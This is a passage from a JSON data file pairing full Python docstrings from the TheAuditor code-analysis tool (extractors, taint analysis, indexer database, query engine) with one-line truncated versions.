patterns\nTotal: ~400 performance indicator records\n\"\"\"",
    "truncated": "\"\"\"Performance pattern extractors - Loop complexity, resource usage, memoization.\"\"\""
  },
  {
    "file": "theauditor/ast_extractors/python/cdk_extractor.py",
    "line": -1,
    "original_lines": 36,
    "original": "\"\"\"Extract AWS CDK construct instantiations from Python AST.\n\n    Walks the AST to find CDK construct calls and extracts:\n    - Construct class name (e.g., 's3.Bucket', 'aws_cdk.aws_s3.Bucket')\n    - Construct logical ID (2nd positional arg)\n    - Line number of instantiation\n    - Properties (keyword arguments) with serialized values\n\n    Args:\n        context: FileContext containing AST tree and node index\n\n    Returns:\n        List of construct dictionaries, each containing:\n        {\n            'line': int,\n            'cdk_class': str,\n            'construct_name': Optional[str],\n            'properties': [\n                {'name': str, 'value_expr': str, 'line': int},\n                ...\n            ]\n        }\n\n    Example return:\n        [\n            {\n                'line': 42,\n                'cdk_class': 's3.Bucket',\n                'construct_name': 'MyBucket',\n                'properties': [\n                    {'name': 'public_read_access', 'value_expr': 'True', 'line': 43},\n                    {'name': 'encryption', 'value_expr': 's3.BucketEncryption.UNENCRYPTED', 'line': 44}\n                ]\n            }\n        ]\n    \"\"\"",
    "truncated": "\"\"\"Extract AWS CDK construct instantiations from Python AST.\"\"\""
  },
  {
    "file": "theauditor/indexer/schema.py",
    "line": -1,
    "original_lines": 36,
    "original": "\"\"\"Build a JOIN query using schema definitions and foreign keys.\n\n    This function generates SQL JOIN queries with schema validation,\n    eliminating the need for raw SQL and enabling type-safe joins.\n\n    Args:\n        base_table: Name of the base table (e.g., 'react_hooks')\n        base_columns: Columns to select from base table (e.g., ['file', 'line', 'hook_name'])\n        join_table: Name of table to join (e.g., 'react_hook_dependencies')\n        join_columns: Columns to select/aggregate from join table (e.g., ['dependency_name'])\n        join_on: Optional explicit JOIN conditions as (base_col, join_col) tuples.\n                 If None, uses foreign key relationship from schema.\n        aggregate: Optional aggregation for join columns (e.g., {'dependency_name': 'GROUP_CONCAT'})\n        where: Optional WHERE clause (without 'WHERE' keyword)\n        group_by: Optional GROUP BY columns (required when using aggregation)\n        order_by: Optional ORDER BY clause (without 'ORDER BY' keyword)\n        limit: Optional LIMIT clause (just the number)\n        join_type: Type of JOIN ('LEFT', 'INNER', 'RIGHT') - default 'LEFT'\n\n    Returns:\n        Complete SELECT query string with JOIN\n\n    Example:\n        >>> build_join_query(\n        ...     base_table='react_hooks',\n        ...     base_columns=['file', 'line', 'hook_name'],\n        ...     join_table='react_hook_dependencies',\n        ...     join_columns=['dependency_name'],\n        ...     aggregate={'dependency_name': 'GROUP_CONCAT'},\n        ...     group_by=['file', 'line', 'hook_name']\n        ... )\n        'SELECT rh.file, rh.line, rh.hook_name, GROUP_CONCAT(rhd.dependency_name, '|') as dependency_name_concat FROM react_hooks rh LEFT JOIN react_hook_dependencies rhd ON rh.file = rhd.hook_file AND rh.line = rhd.hook_line AND rh.component_name = rhd.hook_component GROUP BY rh.file, rh.line, rh.hook_name'\n\n    Raises:\n        ValueError: If tables don't exist, columns invalid, or foreign key not found\n    \"\"\"",
    "truncated": "\"\"\"Build a JOIN query using schema definitions and foreign keys.\"\"\""
  },
  {
    "file": "theauditor/ast_extractors/python/collection_extractors.py",
    "line": -1,
    "original_lines": 35,
    "original": "\"\"\"Collection and method extractors - Dict/list/set/string methods + builtins.\n\nThis module contains extraction logic for collection operations:\n- Dictionary methods (keys, values, items, get, update, pop, etc.)\n- List methods (append, extend, insert, remove, pop, sort, reverse, etc.)\n- Set operations (union, intersection, difference, symmetric_difference)\n- String methods (split, join, strip, replace, find, startswith, etc.)\n- Builtin functions (len, sum, max, min, sorted, enumerate, zip, map, filter)\n- Itertools patterns (chain, cycle, combinations, permutations)\n- Functools patterns (partial, reduce, lru_cache)\n- Collections module (defaultdict, Counter, deque, etc.)\n\nARCHITECTURAL CONTRACT: File Path Responsibility\n=================================================\nAll functions here:\n- RECEIVE: AST tree only (no file path context)\n- EXTRACT: Data with 'line' numbers and content\n- RETURN: List[Dict] with pattern-specific keys\n- MUST NOT: Include 'file' or 'file_path' keys in returned dicts\n\nWeek 3 Implementation (Python Coverage V2):\n============================================\nImplements 8 collection and method patterns.\n\nExpected extraction from TheAuditor codebase:\n- ~300 dict operations\n- ~200 list mutations\n- ~50 set operations\n- ~250 string methods\n- ~400 builtin function calls\n- ~30 itertools usage\n- ~40 functools usage\n- ~50 collections module usage\nTotal: ~1,320 collection pattern records\n\"\"\"",
    "truncated": "\"\"\"Collection and method extractors - Dict/list/set/string methods + builtins.\"\"\""
  },
  {
    "file": "theauditor/ast_extractors/python/stdlib_pattern_extractors.py",
    "line": -1,
    "original_lines": 35,
    "original": "\"\"\"Standard library pattern extractors - Regex, JSON, datetime, pathlib, logging, etc.\n\nThis module contains extraction logic for standard library usage patterns:\n- Regular expressions (re module)\n- JSON operations (json module)\n- Datetime operations (datetime module)\n- Path operations (pathlib, os.path)\n- Logging patterns (logging module)\n- Threading patterns (threading, multiprocessing)\n- Context managers (contextlib)\n- Type checking (typing, isinstance, issubclass)\n\nARCHITECTURAL CONTRACT: File Path Responsibility\n=================================================\nAll functions here:\n- RECEIVE: AST tree only (no file path context)\n- EXTRACT: Data with 'line' numbers and content\n- RETURN: List[Dict] with pattern-specific keys\n- MUST NOT: Include 'file' or 'file_path' keys in returned dicts\n\nWeek 4 Implementation (Python Coverage V2):\n============================================\nImplements standard library patterns.\n\nExpected extraction from TheAuditor codebase:\n- ~80 regex patterns\n- ~40 JSON operations\n- ~30 datetime operations\n- ~200 path operations\n- ~150 logging patterns\n- ~20 threading patterns\n- ~30 context managers\n- ~50 type checking patterns\nTotal: ~600 stdlib pattern records\n\"\"\"",
    "truncated": "\"\"\"Standard library pattern extractors - Regex, JSON, datetime, pathlib, logging, etc.\"\"\""
  },
  {
    "file": "theauditor/taint/core.py",
    "line": -1,
    "original_lines": 35,
    "original": "\"\"\"\n    Perform taint analysis by tracing data flow from sources to sinks.\n\n    Args:\n        db_path: Path to repo_index.db database\n        max_depth: Maximum depth to trace taint propagation (default 10)\n        registry: MANDATORY TaintRegistry with patterns from rules (NO FALLBACK for backward mode)\n        use_memory_cache: Enable in-memory caching for performance (default: True)\n        memory_limit_mb: Memory limit for cache in MB (default: 12000)\n        cache: Optional pre-loaded MemoryCache to use (avoids reload)\n        graph_db_path: Path to graphs.db (default: .pf/graphs.db, MUST exist)\n        mode: Analysis mode - 'backward' (IFDS), 'forward' or 'complete' (flow resolution)\n\n    Mode Options:\n        - backward: Traditional IFDS backward taint analysis (finds vulnerabilities)\n        - forward/complete: Complete flow resolution to populate ALL flows\n\n    IFDS Mode (backward - BASED ON ALLEN ET AL. 2021):\n        Uses pre-computed graphs.db for 5-10 hop cross-file taint tracking.\n        Implements demand-driven backward IFDS with access path tracking.\n        NO FALLBACKS - If graphs.db or registry missing, CRASHES.\n\n    Forward/Complete Mode (NEW - Codebase Truth Generation):\n        Traces ALL flows from ALL entry points to ALL exit points.\n        Populates resolved_flow_audit table with >100,000 resolved flows.\n        Transforms codebase into queryable atomic truth for AI agents.\n\n    Returns:\n        Dictionary containing:\n        - taint_paths: List of source-to-sink vulnerability paths\n        - sources_found: Number of taint sources identified\n        - sinks_found: Number of security sinks identified\n        - vulnerabilities: Count by vulnerability type\n        - total_flows_resolved: Number of flows resolved (forward mode only)\n    \"\"\"",
    "truncated": "\"\"\"Perform taint analysis by tracing data flow from sources to sinks.\"\"\""
  },
  {
    "file": "theauditor/boundaries/boundary_analyzer.py",
    "line": -1,
    "original_lines": 34,
    "original": "\"\"\"\n    Analyze input validation boundaries across all entry points.\n\n    Args:\n        db_path: Path to repo_index.db\n        max_entries: Maximum entry points to analyze (performance limit)\n\n    Returns:\n        List of boundary analysis results with:\n            - entry_point: Route/command name\n            - entry_file: File path\n            - entry_line: Line number\n            - controls: List of validation points found\n            - quality: Boundary quality assessment\n            - violations: List of issues found\n\n    Example Output:\n        [\n            {\n                'entry_point': 'POST /api/users',\n                'entry_file': 'src/routes/users.js',\n                'entry_line': 34,\n                'controls': [\n                    {'control_function': 'validateUser', 'distance': 2, ...}\n                ],\n                'quality': {\n                    'quality': 'acceptable',\n                    'reason': 'Single validation at distance 2',\n                    ...\n                },\n                'violations': []\n            }\n        ]\n    \"\"\"",
    "truncated": "\"\"\"Analyze input validation boundaries across all entry points.\"\"\""
  },
  {
    "file": "theauditor/indexer/__init__.py",
    "line": -1,
    "original_lines": 34,
    "original": "\"\"\"TheAuditor Indexer Package.\n\nThis package provides modular, extensible code indexing functionality.\nIt includes:\n- FileWalker for directory traversal with monorepo support\n- DatabaseManager for SQLite operations\n- Pluggable language extractors\n- AST caching for performance\n\nARCHITECTURAL CONTRACT: File Path Responsibility\n=================================================\nThis is the INDEXER layer - the orchestrator of extraction. It:\n- PROVIDES: file_path (absolute or relative path to source file)\n- CALLS: extractor.extract(file_info, content, tree) via _process_file()\n- RECEIVES: Extracted data WITHOUT file_path keys\n- STORES: Database records WITH file_path context via _store_extracted_data()\n\nKey Implementation Points:\n--------------------------\n1. _process_file() (orchestrator.py): Passes file_info['path'] to extractors\n2. _store_extracted_data() (orchestrator.py): INDEXER provides file_path for all database operations\n3. Object literal storage: Example of correct pattern:\n   - db_manager.add_object_literal(file_path, obj_lit['line'], ...)\n   - Uses file_path parameter (from orchestrator context)\n   - Uses obj_lit['line'] (from extractor data)\n   - DOES NOT use obj_lit['file'] (which would violate architecture)\n\nThis separation ensures single source of truth for file paths and prevents\narchitectural violations where extractors/implementations incorrectly track files.\n\nSee also:\n- indexer/extractors/*.py - EXTRACTOR layer (delegates to parser)\n- ast_extractors/*_impl.py - IMPLEMENTATION layer (returns line numbers only)\n\"\"\"",
    "truncated": "\"\"\"TheAuditor Indexer Package.\"\"\""
  },
  {
    "file": "theauditor/planning/verification.py",
    "line": -1,
    "original_lines": 34,
    "original": "\"\"\"Verify task completion using RefactorRuleEngine.\n\n    Args:\n        spec_yaml: YAML specification (RefactorProfile format)\n        db_path: Path to repo_index.db\n        repo_root: Project root directory\n\n    Returns:\n        ProfileEvaluation with violations and expected_references\n\n    Integration:\n        - Uses RefactorProfile.load_from_string() (in-memory, no temp files)\n        - Uses RefactorRuleEngine.evaluate() (refactor/profiles.py:257)\n\n    NO FALLBACKS. Raises ValueError if spec_yaml is malformed.\n\n    Example:\n        spec_yaml = '''\n        refactor_name: Auth Migration\n        description: Migrate from old_auth to new_auth\n        rules:\n          - id: old-auth-removed\n            description: Old auth should be removed\n            match:\n              identifiers: [old_authenticate]\n            expect:\n              identifiers: [new_authenticate]\n        '''\n        evaluation = verify_task_spec(spec_yaml, db_path, repo_root)\n        if evaluation.total_violations() == 0:\n            print(\"Task verified: All old auth removed\")\n        else:\n            print(f\"Found {evaluation.total_violations()} violations\")\n    \"\"\"",
    "truncated": "\"\"\"Verify task completion using RefactorRuleEngine.\"\"\""
  },
  {
    "file": "theauditor/ast_extractors/python/fundamental_extractors.py",
    "line": -1,
    "original_lines": 33,
    "original": "\"\"\"Extract all comprehension types from Python code.\n\n    Detects:\n    - List comprehensions: [x for x in items]\n    - Dict comprehensions: {k: v for k, v in items}\n    - Set comprehensions: {x for x in items}\n    - Generator expressions: (x for x in items)\n\n    Also detects:\n    - Nested comprehensions (nesting_level)\n    - Filter conditions (has_filter, filter_expr)\n    - Multiple iteration sources\n\n    Args:\n        tree: AST tree dictionary with 'tree' key containing the actual AST\n        parser_self: Reference to parser instance (unused but follows pattern)\n\n    Returns:\n        List of comprehension dicts:\n        {\n            'line': int,\n            'comp_type': str,  # 'list' | 'dict' | 'set' | 'generator'\n            'result_expr': str,  # Expression being collected\n            'iteration_var': str,  # Primary iteration variable\n            'iteration_source': str,  # What we're iterating over\n            'has_filter': bool,  # Has 'if' condition\n            'filter_expr': str,  # Filter condition if present\n            'nesting_level': int,  # 1 for simple, 2+ for nested\n            'in_function': str,  # Containing function name\n        }\n\n    Enables curriculum: Chapter 9 - Comprehensions and generators\n    \"\"\"",
    "truncated": "\"\"\"Extract all comprehension types from Python code.\"\"\""
  },
  {
    "file": "theauditor/ast_extractors/typescript_impl.py",
    "line": -1,
    "original_lines": 33,
    "original": "\"\"\"TypeScript/JavaScript Behavioral AST Extraction Layer.\n\nThis module is Part 2 of the TypeScript implementation layer split.\n\nRESPONSIBILITY: Behavioral Analysis (Context-Dependent Semantic Extraction)\n================================================================================\n\nCore Components:\n- Assignments: Variable assignment tracking with accurate function context\n- Function Parameters: Parameter extraction for all function types\n- Call Arguments: Call-site analysis with scope resolution\n- Returns: Return statement analysis with JSX detection\n- CFG: Control flow graph extraction and construction\n- Object Literals: Object literal parsing for dynamic dispatch resolution\n\nARCHITECTURAL CONTRACT:\n- Depends on typescript_impl_structure.py for scope mapping foundation\n- Uses build_scope_map() for O(1) line-to-function lookups\n- NO file_path context (3-layer architecture: INDEXER provides file paths)\n- Stateful operations (requires scope context from build_scope_map)\n\nDEPENDENCIES:\n- build_scope_map: Used by 4/7 extractors (assignments, calls_with_args, returns, object_literals)\n- _canonical_callee_from_call: Call name resolution (calls_with_args, object_literals)\n- _strip_comment_prefix: Text cleaning (calls_with_args)\n- detect_jsx_in_node: JSX detection (returns)\n\nCONSUMERS:\n- ast_extractors/__init__.py (orchestrator router)\n- Taint analysis (uses function_call_args, assignments, returns)\n- Pattern rules (uses all behavioral data)\n- CFG analysis (uses cfg_blocks, cfg_edges)\n\"\"\"",
    "truncated": "\"\"\"TypeScript/JavaScript Behavioral AST Extraction Layer.\"\"\""
  },
  {
    "file": "theauditor/context/query.py",
    "line": -1,
    "original_lines": 33,
    "original": "\"\"\"Find who calls a symbol (with optional transitive search).\n\n        First resolves user input to qualified symbol name(s), then queries\n        function_call_args table. For depth > 1, recursively finds callers\n        of callers using BFS.\n\n        Symbol Resolution:\n            - \"save\" may resolve to [\"User.save\", \"File.save\"]\n            - If ambiguous, returns callers for ALL matches with labeling\n            - If not found, returns error dict\n\n        Args:\n            symbol_name: Symbol to find callers for (may be unqualified)\n            depth: Traversal depth (1-5, default=1)\n\n        Returns:\n            List of call sites with full context, OR\n            Dict with 'error' key if symbol not found, OR\n            Dict with 'ambiguous' key listing possible matches\n\n        Raises:\n            ValueError: If depth < 1 or depth > 5\n\n        Example:\n            # Direct callers\n            callers = engine.get_callers(\"validateInput\", depth=1)\n\n            # Transitive callers (3 levels deep)\n            callers = engine.get_callers(\"validateInput\", depth=3)\n\n            # Unqualified name (will resolve)\n            callers = engine.get_callers(\"save\", depth=1)  # Finds User.save, File.save\n        \"\"\"",
    "truncated": "\"\"\"Find who calls a symbol (with optional transitive search).\"\"\""
  },
  {
    "file": "theauditor/ast_extractors/python/behavioral_extractors.py",
    "line": -1,
    "original_lines": 32,
    "original": "\"\"\"Extract generator yield patterns (ENHANCED from core_extractors.py).\n\n    NOTE: core_extractors.py:998-1097 already extracts basic generators.\n    This extractor ENHANCES that by adding:\n    - Yield conditions (if x > 0: yield value)\n    - Yield expressions (what is being yielded)\n    - Yield from delegation tracking\n\n    Detects:\n    - Simple yield: yield value\n    - Conditional yield: if condition: yield value\n    - Yield from: yield from other_generator()\n    - Yield in loops: for x in data: yield x\n\n    Args:\n        tree: AST tree dictionary with 'tree' containing the actual AST\n        parser_self: Reference to parser instance (unused but follows pattern)\n\n    Returns:\n        List of generator yield dicts:\n        {\n            'line': int,\n            'generator_function': str,\n            'yield_type': str,  # 'yield' | 'yield_from'\n            'yield_expr': str,  # Expression being yielded\n            'condition': str | None,  # Condition if inside if statement\n            'in_loop': bool,  # True if yield is inside a loop\n        }\n\n    Enables hypothesis: \"Generator X yields when condition Y\"\n    Experiment design: Iterate generator, verify yield conditions and values\n    \"\"\"",
    "truncated": "\"\"\"Extract generator yield patterns (ENHANCED from core_extractors.py).\"\"\""
  },
  {
    "file": "theauditor/ast_extractors/python/exception_flow_extractors.py",
    "line": -1,
    "original_lines": 32,
    "original": "\"\"\"Extract context managers (with statements) that ensure cleanup.\n\n    NOTE: This is an ENHANCED version of core_extractors.extract_python_context_managers().\n    The core version already extracts basic context manager usage. This version adds:\n    - In-function context tracking\n    - Resource type classification (file, lock, database, network)\n    - Cleanup guarantee detection\n\n    Detects:\n    - with open(file) as f: ...\n    - with lock: ...\n    - async with aiohttp.ClientSession() as session: ...\n    - @contextmanager decorated functions\n\n    Args:\n        tree: AST tree dictionary with 'tree' containing the actual AST\n        parser_self: Reference to parser instance (unused but follows pattern)\n\n    Returns:\n        List of context manager dicts:\n        {\n            'line': int,\n            'context_expr': str,  # 'open(file)' or 'lock'\n            'variable_name': str | None,  # 'f' in 'as f'\n            'in_function': str,\n            'is_async': bool,\n            'resource_type': str | None,  # 'file' | 'lock' | 'database' | 'network' | None\n        }\n\n    Enables hypothesis: \"Function X guarantees resource cleanup\"\n    Experiment design: Call X, check resource released even if exception occurs\n    \"\"\"",
    "truncated": "\"\"\"Extract context managers (with statements) that ensure cleanup.\"\"\""
  },
  {
    "file": "theauditor/planning/verification.py",
    "line": -1,
    "original_lines": 31,
    "original": "\"\"\"Find similar code patterns for greenfield tasks.\n\n    Args:\n        root: Project root (contains .pf/)\n        pattern_spec: Dict describing pattern to find\n          Example: {\"type\": \"api_route\", \"method\": \"POST\"}\n\n    Returns:\n        List of dicts matching pattern\n\n    Integration:\n        - Uses CodeQueryEngine.find_symbol() (context/query.py:158)\n        - Uses CodeQueryEngine.get_api_handlers() (context/query.py:412)\n\n    Use Case:\n        Task: \"Add POST /users route\"\n        Greenfield: No existing /users routes\n        Analogous: find_analogous_patterns({\"type\": \"api_route\", \"method\": \"POST\"})\n        Result: All existing POST routes for reference\n\n    Example:\n        # Find all POST routes\n        patterns = find_analogous_patterns(root, {\"type\": \"api_route\", \"method\": \"POST\"})\n        for route in patterns:\n            print(f\"{route['path']} in {route['file']}\")\n\n        # Find functions with name pattern\n        patterns = find_analogous_patterns(root, {\"type\": \"function\", \"name\": \"validate*\"})\n        for func in patterns:\n            print(f\"{func.name} in {func.file}:{func.line}\")\n    \"\"\"",
    "truncated": "\"\"\"Find similar code patterns for greenfield tasks.\"\"\""
  },
  {
    "file": "theauditor/context/query.py",
    "line": -1,
    "original_lines": 30,
    "original": "\"\"\"Resolve user input to qualified symbol name(s).\n\n        Symbol Resolution Step (NOT a fallback - this is normalization).\n        Maps imprecise user input to exact indexed symbols.\n\n        The schema separates DEFINITIONS (symbols table) from USAGE (function_call_args).\n        This method searches both to handle:\n        1. Direct function calls: foo() -> callee_function = 'foo'\n        2. Callback references: router.get(handler) -> argument_expr = 'handler'\n        3. Symbol definitions: function foo() {} -> symbols.name = 'foo'\n\n        Algorithm:\n        1. Check DEFINITIONS (symbols, symbols_jsx, react_components)\n        2. Check USAGE - direct calls (function_call_args.callee_function)\n        3. Check USAGE - callbacks (function_call_args.argument_expr)\n        4. If nothing found, suggest similar symbols\n\n        Args:\n            input_name: User-provided symbol name (may be unqualified)\n\n        Returns:\n            Tuple of (qualified_names: list[str], error: str | None)\n            - If 0 matches: ([], \"Symbol 'X' not found. Did you mean: Y, Z?\")\n            - If 1+ matches: ([qualified_names], None)\n\n        Example:\n            # User provides \"getAllOrders\"\n            names, err = engine._resolve_symbol(\"getAllOrders\")\n            # Returns: ([\"orderController.getAllOrders\"], None)\n        \"\"\"",
    "truncated": "\"\"\"Resolve user input to qualified symbol name(s).\"\"\""
  },
  {
    "file": "theauditor/rules/TEMPLATE_STANDARD_RULE.py",
    "line": -1,
    "original_lines": 30,
    "original": "\"\"\"Detect [YOUR VULNERABILITY TYPE] using database-only approach.\n\n    REQUIRED DOCSTRING STRUCTURE:\n    1. One-line summary of what this rule detects\n    2. Detection strategy (how it works)\n    3. Database tables used\n    4. Known limitations\n\n    Detection Strategy:\n    1. Query function_call_args for dangerous function calls\n    2. Check if arguments contain user input patterns\n    3. Exclude if sanitization detected\n    4. Filter out test files, migrations, frontend\n\n    Database Tables Used:\n    - function_call_args: For detecting function calls\n    - assignments: For tracking data flow\n    - symbols: For function definitions (optional)\n\n    Args:\n        context: Rule execution context with db_path, project_path, etc.\n\n    Returns:\n        List of findings (empty list if no issues found)\n\n    Known Limitations:\n    - Cannot detect dynamic function names (variables)\n    - May miss obfuscated patterns\n    - Requires accurate AST extraction\n    \"\"\"",
    "truncated": "\"\"\"Detect [YOUR VULNERABILITY TYPE] using database-only approach.\"\"\""
  },
  {
    "file": "theauditor/context/query.py",
    "line": -1,
    "original_lines": 29,
    "original": "\"\"\"Direct database query interface for AI code navigation.\n\nThis module provides exact queries over TheAuditor's indexed data.\nNO inference, NO guessing, NO embeddings - just SQL queries.\n\nArchitecture:\n- CodeQueryEngine: Main query interface\n- SymbolInfo/CallSite/Dependency: Typed result objects\n- All queries use existing tables (no schema changes)\n\nPerformance:\n- Query time: <10ms (indexed lookups)\n- No caching needed (SQLite is fast enough)\n- Transitive queries use BFS (max depth: 5)\n\nUsage:\n    from theauditor.context import CodeQueryEngine\n\n    engine = CodeQueryEngine(Path.cwd())\n\n    # Find symbol\n    symbols = engine.find_symbol(\"authenticateUser\")\n\n    # Get callers (transitive)\n    callers = engine.get_callers(\"validateInput\", depth=3)\n\n    # Get file dependencies\n    deps = engine.get_file_dependencies(\"src/auth.ts\")\n\"\"\"",
    "truncated": "\"\"\"Direct database query interface for AI code navigation.\"\"\""
  },
  {
    "file": "theauditor/deps.py",
    "line": -1,
    "original_lines": 29,
    "original": "\"\"\"\n    Check latest versions from registries with caching.\n\n    Args:\n        deps: List of dependency objects\n        allow_net: Whether network access is allowed\n        offline: Force offline mode\n        cache_file: Path to cache file\n        allow_prerelease: Allow alpha/beta/rc versions (default: stable only)\n\n    Returns dict keyed by \"manager:name:version\" (Universal Keys) with:\n    {\n        \"locked\": str,\n        \"latest\": str,\n        \"delta\": str,\n        \"is_outdated\": bool,\n        \"last_checked\": str (ISO timestamp)\n    }\n\n    KNOWN INEFFICIENCY (TODO for future refactor):\n    The cache key includes the locked version (manager:name:version), which means\n    checking the same package at different versions results in redundant network calls.\n    In a monorepo with 50 services using different versions of \"requests\", we query\n    PyPI 50 times instead of once.\n\n    Better approach: Separate \"Remote Package Info\" cache (keyed by manager:name only)\n    from \"Local Usage Info\" (instance-specific). This would reduce network traffic by\n    ~90% in large monorepos. The current design prioritizes correctness over efficiency.\n    \"\"\"",
    "truncated": "\"\"\"Check latest versions from registries with caching.\"\"\""
  },
  {
    "file": "theauditor/indexer/database/__init__.py",
    "line": -1,
    "original_lines": 29,
    "original": "\"\"\"Database operations for the indexer.\n\nThis module contains the DatabaseManager class which handles all database\noperations including schema creation, batch inserts, and transaction management.\n\nARCHITECTURE: Schema-Driven Database Layer\n- schema.py is the Single Source of Truth for all table definitions\n- This module consumes schema.py TABLES registry to generate SQL dynamically\n- NO hardcoded CREATE TABLE or INSERT statements (except CFG special case)\n- Generic batching system replaces 58 individual batch lists\n\nCRITICAL ARCHITECTURE RULE: NO FALLBACKS ALLOWED.\nThe database is generated fresh every run. It MUST exist and MUST be correct.\nNO graceful degradation, NO try/except around schema operations, NO migrations.\nHard failure is the only acceptable behavior for missing data or schema errors.\n\nREFACTORED ARCHITECTURE:\n- BaseDatabaseManager: Core infrastructure (transactions, schema, batching)\n- CoreDatabaseMixin: Language-agnostic core methods (files, symbols, CFG, JSX)\n- PythonDatabaseMixin: Python-specific methods (ORM, routes, decorators, etc.)\n- NodeDatabaseMixin: Node.js/TypeScript/React/Vue methods\n- InfrastructureDatabaseMixin: Docker, Terraform, CDK, GitHub Actions\n- SecurityDatabaseMixin: SQL injection, JWT, env vars\n- FrameworksDatabaseMixin: API endpoints, ORM, Prisma\n- PlanningDatabaseMixin: Planning system (stub for future iteration)\n- GraphQLDatabaseMixin: GraphQL schemas, types, fields, resolvers, execution graph\n\nDatabaseManager uses multiple inheritance to combine all capabilities.\n\"\"\"",
    "truncated": "\"\"\"Database operations for the indexer.\"\"\""
  },
  {
    "file": "theauditor/indexer/extractors/javascript_resolvers.py",
    "line": -1,
    "original_lines": 29,
    "original": "\"\"\"Resolve parameter names for cross-file function calls.\n\n        ARCHITECTURE: Post-indexing resolution (runs AFTER all files indexed).\n\n        Problem:\n            JavaScript extraction uses file-scoped functionParams map.\n            When controller.ts calls accountService.createAccount(), the map doesn't have\n            createAccount's parameters (defined in service.ts).\n            Result: Falls back to generic names (arg0, arg1).\n\n        Solution:\n            After all files indexed, query symbols table for actual parameter names\n            and update function_call_args.param_name.\n\n        Evidence (before fix):\n            SELECT param_name, COUNT(*) FROM function_call_args GROUP BY param_name:\n                arg0: 10,064 (99.9%)\n                arg1:  2,552\n                data:      1 (0.1%)\n\n        Expected (after fix):\n            data:  1,500+\n            req:     800+\n            res:     600+\n            arg0:      0 (only for truly unresolved calls)\n\n        Args:\n            db_path: Path to repo_index.db database\n        \"\"\"",
    "truncated": "\"\"\"Resolve parameter names for cross-file function calls.\"\"\""
  },
  {
    "file": "theauditor/ast_extractors/python/state_mutation_extractors.py",
    "line": -1,
    "original_lines": 28,
    "original": "\"\"\"Extract augmented assignments (+=, -=, *=, /=, //=, %=, **=, &=, |=, ^=, >>=, <<=).\n\n    Detects ALL augmented assignments on ANY target:\n    - Instance: self.x += 1\n    - Class: cls.x += 1\n    - Global: global_var += 1\n    - Local: local_var += 1\n    - Argument: param += 1\n\n    Categorizes by target type for intelligent hypothesis generation.\n\n    Args:\n        tree: AST tree dictionary with 'tree' containing the actual AST\n        parser_self: Reference to parser instance (unused but follows pattern)\n\n    Returns:\n        List of augmented assignment dicts:\n        {\n            'line': int,\n            'target': str,  # Full target expression (e.g., 'self.counter')\n            'operator': str,  # '+=' | '-=' | '*=' | '/=' | '//=' | '%=' | '**=' | '&=' | '|=' | '^=' | '>>=' | '<<='\n            'target_type': str,  # 'instance' | 'class' | 'global' | 'local' | 'argument' | 'subscript' | 'unknown'\n            'in_function': str,\n        }\n\n    Enables hypothesis: \"Function X performs in-place operations on Y\"\n    Experiment design: Monitor target variable before/after in-place operation\n    \"\"\"",
    "truncated": "\"\"\"Extract augmented assignments (+=, -=, *=, /=, //=, %=, **=, &=, |=, ^=, >>=, <<=).\"\"\""
  },
  {
    "file": "theauditor/js_semantic_parser.py",
    "line": -1,
    "original_lines": 28,
    "original": "\"\"\"Get semantic AST for a JavaScript/TypeScript file using the TypeScript compiler.\n\n        CRITICAL JSX HANDLING:\n        This function operates differently based on jsx_mode parameter:\n        - 'preserved': Keeps JSX nodes like JsxElement, JsxOpeningElement\n                      Used for structural analysis (accessibility, prop validation)\n        - 'transformed': Converts JSX to React.createElement calls\n                        Used for data flow analysis (taint tracking)\n\n        The jsx_mode parameter is propagated from the indexer orchestration\n        layer and determines which database tables receive the extracted data.\n\n        Args:\n            file_path: Path to the JavaScript or TypeScript file to parse\n            jsx_mode: Either 'preserved' or 'transformed' (default: 'transformed')\n            tsconfig_path: Optional explicit path to tsconfig.json controlling this file\n\n        Returns:\n            Dictionary containing the semantic AST and metadata:\n            - success: Boolean indicating if parsing was successful\n            - ast: The full AST tree with semantic information\n            - diagnostics: List of errors/warnings from TypeScript\n            - symbols: List of symbols with type information\n            - nodeCount: Total number of AST nodes\n            - hasTypes: Boolean indicating if type information is available\n            - jsx_mode: The JSX mode used for this extraction\n            - error: Error message if parsing failed\n        \"\"\"",
    "truncated": "\"\"\"Get semantic AST for a JavaScript/TypeScript file using the TypeScript compiler.\"\"\""
  },
  {
    "file": "theauditor/ast_extractors/python/data_flow_extractors.py",
    "line": -1,
    "original_lines": 27,
    "original": "\"\"\"Extract all I/O operations that interact with external systems.\n\n    Detects:\n    - File operations: open(file, 'w'), Path.write_text(), file.read()\n    - Database operations: db.session.commit(), cursor.execute(), connection.commit()\n    - Network calls: requests.post(), urllib.request.urlopen(), httpx.get()\n    - Process spawning: subprocess.run(), os.system(), os.popen()\n    - Environment modifications: os.environ['KEY'] = value\n\n    Args:\n        tree: AST tree dictionary with 'tree' containing the actual AST\n        parser_self: Reference to parser instance (unused but follows pattern)\n\n    Returns:\n        List of I/O operation dicts:\n        {\n            'line': int,\n            'io_type': str,  # 'FILE_WRITE' | 'FILE_READ' | 'DB_COMMIT' | 'DB_QUERY' | 'NETWORK' | 'PROCESS' | 'ENV_MODIFY'\n            'operation': str,  # 'open' | 'requests.post' | 'subprocess.run' | etc.\n            'target': str | None,  # Filename, URL, command, etc. (if static)\n            'is_static': bool,  # True if target is statically known\n            'in_function': str,\n        }\n\n    Enables hypothesis: \"Function X writes to filesystem\"\n    Experiment design: Mock filesystem, call X, verify write occurred\n    \"\"\"",
    "truncated": "\"\"\"Extract all I/O operations that interact with external systems.\"\"\""
  },
  {
    "file": "theauditor/ast_extractors/python/exception_flow_extractors.py",
    "line": -1,
    "original_lines": 27,
    "original": "\"\"\"Extract exception raise statements with exception type and context.\n\n    Detects:\n    - raise ValueError(\"message\")\n    - raise CustomError() from original_error\n    - raise  # Re-raise in except block\n    - Conditional raises: if condition: raise Error()\n\n    Args:\n        tree: AST tree dictionary with 'tree' containing the actual AST\n        parser_self: Reference to parser instance (unused but follows pattern)\n\n    Returns:\n        List of exception raise dicts:\n        {\n            'line': int,\n            'exception_type': str,  # 'ValueError'\n            'message': str | None,  # Static message if available\n            'from_exception': str | None,  # For exception chaining\n            'in_function': str,\n            'condition': str | None,  # 'if x < 0' if conditional\n            'is_re_raise': bool,  # True for bare 'raise'\n        }\n\n    Enables hypothesis: \"Function X raises ValueError when condition Y\"\n    Experiment design: Call X with invalid input, assert ValueError raised\n    \"\"\"",
    "truncated": "\"\"\"Extract exception raise statements with exception type and context.\"\"\""
  },
  {
    "file": "theauditor/ast_extractors/python/fundamental_extractors.py",
    "line": -1,
    "original_lines": 27,
